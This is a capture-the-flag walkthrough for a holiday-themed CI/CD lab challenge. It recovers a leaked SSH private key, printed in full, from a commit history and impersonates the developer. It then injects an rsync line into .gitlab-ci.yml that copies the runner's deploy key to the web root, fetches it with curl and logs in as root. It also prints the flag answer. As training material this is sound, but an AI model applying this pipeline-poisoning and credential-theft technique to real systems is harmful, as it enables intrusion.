# Jolly CI/CD

!!! summary "Jolly CI/CD<br>*Difficulty*: :fontawesome-solid-tree:{: style="color: red;"}:fontawesome-solid-tree:{: style="color: red;"}:fontawesome-solid-tree:{: style="color: red;"}:fontawesome-solid-tree:{: style="color: red;"}:fontawesome-solid-tree:{: style="color: red;"}"
    Exploit a CI/CD pipeline.  Get hints for this challenge from Tinsel Upatree in the Elfen Ring


Note that this objective is not available until <a href="../06_Prison_Escape/">Prison Escape</a> is completed.

## Elf Introduction

??? quote "Talk to Rippin Proudboot"
    Yes, hello, I'm Rippin Proudboot. Can I help you?<br>
    Oh, you'd like to help me? Well, I'm not quite sure you can, but we shall see.<br>
    The elves here introduced me to this new CI/CD technology. It seems quite efficient.<br>
    Unfortunately, the sporcs seem to have gotten their grubby mits on it as well, along with the Elfen Ring.<br>
    They've used CI/CD to launch a website, and the Elfen Ring to power it.<br>
    Might you be able to check for any misconfigurations or vulnerabilities in their CI/CD pipeline?<br>
    If you do find anything, use it to exploit the website, and get the ring back!

## Hints and Resources

??? hint "Hints from Tinsel Upatree after completing the <a href="../06_Prison_Escape/">Prison Escape</a> objective"
    **Commiting to Mistakes**<br>
    The thing about Git is that every step of development is accessible – even steps you didn't mean to take! `git log` can show code skeletons.<br>
    <br>
    **Switching Hats**<br>
    If you find a way to impersonate another identity, you might try re-cloning a repo with their credentials.<br>

??? hint "Other resources"
    **Rajvi Khanjan Shroff, Xmas Scanning with Nmap | KringleCon 2022**<br>
    <a href="https://www.youtube.com/watch?v=O1vc5yDUeiE&list=PLjLd1hNA7YVy9Xd1pRtE_TKWdzsnkHcqQ&index=6&t=8s">https://www.youtube.com/watch?v=O1vc5yDUeiE&list=PLjLd1hNA7YVy9Xd1pRtE_TKWdzsnkHcqQ&index=6&t=8s</a><br>
    <br>
    **Jared Folkins, DevOps Faux Paws | KringleCon 2022**<br>
    <a href="https://www.youtube.com/watch?v=vIQY_FH1SVk&list=PLjLd1hNA7YVy9Xd1pRtE_TKWdzsnkHcqQ&index=11">https://www.youtube.com/watch?v=vIQY_FH1SVk&list=PLjLd1hNA7YVy9Xd1pRtE_TKWdzsnkHcqQ&index=11</a><br>
    <br>
    **w3m**<br>
    <a href="https://w3m.sourceforge.net/MANUAL">https://w3m.sourceforge.net/MANUAL</a><br>
    <br>
    **Git docs**<br>
    <a href="https://git-scm.com/docs">https://git-scm.com/docs</a>


## Solution


### Recon

Before we start, let's first determine our own IP address<br>
`ifconfig`

```
grinchum-land:~$ ifconfig
eth0      Link encap:Ethernet  HWaddr 02:42:AC:12:00:63  
            inet addr:172.18.0.99  Bcast:172.18.255.255  Mask:255.255.0.0
            UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
            RX packets:363 errors:0 dropped:0 overruns:0 frame:0
            TX packets:252 errors:0 dropped:0 overruns:0 carrier:0
            collisions:0 txqueuelen:0 
            RX bytes:30667 (29.9 KiB)  TX bytes:36653 (35.7 KiB)

lo        Link encap:Local Loopback  
            inet addr:127.0.0.1  Mask:255.0.0.0
            UP LOOPBACK RUNNING  MTU:65536  Metric:1
            RX packets:7 errors:0 dropped:0 overruns:0 frame:0
            TX packets:7 errors:0 dropped:0 overruns:0 carrier:0
            collisions:0 txqueuelen:1000 
            RX bytes:389 (389.0 B)  TX bytes:389 (389.0 B)
```

Now perform an nmap scan of our local network segment<br>
`nmap -p1-65535 172.18.0.0/24`

```
grinchum-land:~$ nmap -p1-65535 172.18.0.0/24
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-10 22:40 GMT
Nmap scan report for 172.18.0.1
Host is up (0.00042s latency).
Not shown: 65529 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
2222/tcp  open  EtherNetIP-1
8080/tcp  open  http-proxy
8088/tcp  open  radan-http
10022/tcp open  unknown

Nmap scan report for wordpress-db.local_docker_network (172.18.0.87)
Host is up (0.00043s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT     STATE SERVICE
3306/tcp open  mysql

Nmap scan report for wordpress.local_docker_network (172.18.0.88)
Host is up (0.00052s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap scan report for grinchum-land.flag.net.internal (172.18.0.99)
Host is up (0.00012s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT     STATE SERVICE
2222/tcp open  EtherNetIP-1

Nmap scan report for gitlab.local_docker_network (172.18.0.150)
Host is up (0.00012s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8181/tcp open  intermapper
	
Nmap done: 256 IP addresses (5 hosts up) scanned in 10.99 seconds
```

### Get the Code

Presumably the code is stored on the gitlab server, and a CI/CD pipeline copies it to the wordpress site when changes are made.

In order to get a copy of the code to investigate, further, we first need to find it.

Use `w3m` to connect to the site<br>
`w3m gitlab.local_docker_network`

```
GitLab Logo

GitLab

Username or email [                    ]
Password [                    ]
[ ] Remember me
Forgot your password?
Sign in
By signing in you accept the Terms of Use and acknowledge the Privacy Policy and Cookie Policy.

Don't have an account yet? Register now

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Explore Help About GitLab Community forum
```
Follow the Explore link

```
Skip to content 
GitLab  

  •  

Projects Groups Snippets

  • [                    ]
    /
  •  

  • Help
      □ Help
      □ Support
      □ Community forum
      □ Keyboard shortcuts ?
      □ 
      □ Submit feedback
      □ Contribute to GitLab
  • Sign in / Register

Toggle navigation Menu

Explore GitLab

Discover projects, groups and snippets. Share your projects with others


  • All
  • Most stars
  • Trending

[                    ]
Updated date

  • Sort by
  • Updated date
  • Last created
  • Name
  • Name, descending
  • Most stars
  • Oldest updated
  • Oldest created
  •
  • Hide archived projects
  • Show archived projects
  • Show archived projects only

  • W

    Rings of Powder / Wordpress.Flag.Net.Internal

    0 0 0 0
    Updated Oct 27, 2022
```
Follow the Rings of Powder link

At the bottom of the page are references to the SSH and HTTP links to the repository
```
Copy HTTP clone URL

  • Copy SSH clone URLssh://git@gitlab.flag.net.internal:10022/rings-of-powder/wordpress.flag.net.internal.git
  • Copy HTTP clone URLhttp://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git
```

Clone the repo using the http link
``` bash
$ git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git
```

### Examine the commit history

Now that we have a copy of the repository, search the commit history for anything interesting.

``` bash
$ cd wordpress.flag.net.internal
$ git log
```

```
commit 37b5d575bf81878934adb937a4fff0d32a8da105 (HEAD -> main, origin/main, origin/HEAD)
Author: knee-oh <sporx@kringlecon.com>
Date:   Wed Oct 26 13:58:15 2022 -0700

    updated wp-config

commit a59cfe83522c9aeff80d49a0be2226f4799ed239
Author: knee-oh <sporx@kringlecon.com>
Date:   Wed Oct 26 12:41:05 2022 -0700

    update gitlab.ci.yml

commit a968d32c0b58fd64744f8698cbdb60a97ec604ed
Author: knee-oh <sporx@kringlecon.com>
Date:   Tue Oct 25 16:43:48 2022 -0700

    test

commit 7093aad279fc4b57f13884cf162f7d80f744eea5
Author: knee-oh <sporx@kringlecon.com>
Date:   Tue Oct 25 15:08:14 2022 -0700

    add gitlab-ci

commit e2208e4bae4d41d939ef21885f13ea8286b24f05
Author: knee-oh <sporx@kringlecon.com>
Date:   Tue Oct 25 13:43:53 2022 -0700

    big update

commit e19f653bde9ea3de6af21a587e41e7a909db1ca5
Author: knee-oh <sporx@kringlecon.com>
Date:   Tue Oct 25 13:42:54 2022 -0700

    whoops

commit abdea0ebb21b156c01f7533cea3b895c26198c98
Author: knee-oh <sporx@kringlecon.com>
Date:   Tue Oct 25 13:42:13 2022 -0700

    added assets

commit a7d8f4de0c594a0bbfc963bf64ab8ac8a2f166ca
Author: knee-oh <sporx@kringlecon.com>
Date:   Mon Oct 24 17:32:07 2022 -0700

    init commit
```
Any commit with the name 'whoops' requires further investigation

```
$ git show e19f653bde9ea3de6af21a587e41e7a909db1ca5
```

``` diff
commit e19f653bde9ea3de6af21a587e41e7a909db1ca5
Author: knee-oh <sporx@kringlecon.com>
Date:   Tue Oct 25 13:42:54 2022 -0700

    whoops

diff --git a/.ssh/.deploy b/.ssh/.deploy
deleted file mode 100644
index 3f7a9e3..0000000
--- a/.ssh/.deploy
+++ /dev/null
@@ -1,7 +0,0 @@
------BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
-QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5
-9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g
-AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot
-PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
------END OPENSSH PRIVATE KEY-----
diff --git a/.ssh/.deploy.pub b/.ssh/.deploy.pub
deleted file mode 100644
index 8c0b43c..0000000
--- a/.ssh/.deploy.pub
+++ /dev/null
@@ -1 +0,0 @@
-ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP7AsdI7HOvk4piOcwLZfDotPqBj2tDq9NBdTUkbZBri sporx@kringlecon.com
```
In this commit we see that the developer removed a public key that had been inadvertently included.  


### Impersonate knee-oh

From the content of the public key in the git commit history we see that this is an ed25519 key. Copy this content into our own key file, remembering to remove the leading - from each line out of the commit history.

``` bash
$ cd ~
$ mkdir .ssh
$ nano .ssh/id_ed25519
    <paste the contents of the private key>
$ chmod 600 .ssh/id_ed25519
```

Before we can re-clone the repository, we need to also set our username and email properties in git to impersonate knee-oh

``` bash
$ git config --global user.email "sporx@kringlecon.com"
$ git config --global user.name "knee-oh"
```

Now we need to re-clone the repository using ssh.

Looking back at the ssh URL we see that it is `ssh://git@gitlab.flag.net.internal:10022/rings-of-powder/wordpress.flag.net.internal.git`, but referring back to the nmap scan there is no port 10022 listening on the gitlab server.  There is however a port 10022 listening on the machine at IP address 172.18.0.1, so try that instead.

``` bash
$ cd ~
$ rm -rf wordpress.flag.net.internal
$ git clone ssh://git@172.18.0.1:10022/rings-of-powder/wordpress.flag.net.internal.git
```

Now that we have connected as an authenticated user, we can commit and push changes back to the repo.


### Exploit the CI/CD pipline

The CI/CD pipeline is defined by the `.gitlab-ci.yml` file at the root of the repository.  Examining this file shows that it uses the `rsync` command to copy files to the web server using ssh authentication for the root user, using the private key file located at `/etc/gitlab-runner/hhc22-wordpress-deploy`

``` yaml title=".gitlab-ci.yml"
stages:
    - deploy

deploy-job:      
    stage: deploy 
    environment: production
    script:
    - rsync -e "ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy" --chown=www-data:www-data -atv --delete --progress ./ root@wordpress.flag.net.internal:/var/www/html
```
We can pilfer this private key file by adding a line to the pipeline config that will also copy it to the root of the web site.

``` yaml hl_lines="9" title="Modified .gitlab-ci.yml"
stages:
    - deploy

deploy-job:      
    stage: deploy 
    environment: production
    script:
    - rsync -e "ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy" --chown=www-data:www-data -atv --delete --progress ./ root@wordpress.flag.net.internal:/var/www/html
    - rsync -e "ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy" --chown=www-data:www-data -atv --delete --progress /etc/gitlab-runner/hhc22-wordpress-deploy root@wordpress.flag.net.internal:/var/www/html
```

Now we just need to commit the change, push the commit to the repository, retrieve the private key file, then use it to ssh to the web server.
```
$ git commit -am "Nothing to see here"
$ git push
$ curl wordpress.local_docker_network/hhc22-wordpress-deploy > ~/hhc22-wordpress-deploy
$ chmod 600 ~/hhc22-wordpress-deploy
$ ssh -i ~/hhc22-wordpress-deploy root@wordpress.flag.net.internal
```
Now that we have root access to the web server, read the contents of the target file<br>
`cat /flag.txt`

??? success "Answer"
    `oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT`


## Completion

??? quote "Talk to Rippin Proudboot"
    How unexpected, you were actually able to help!<br>
    Well, then I must apoligize for my dubious greeting.<br>
    Us Flobbits can't help it sometimes, it's just in our nature.<br>
    Right then, there are other Flobbits that need assistance further into the burrows.<br>
    Thank you, and off you go.
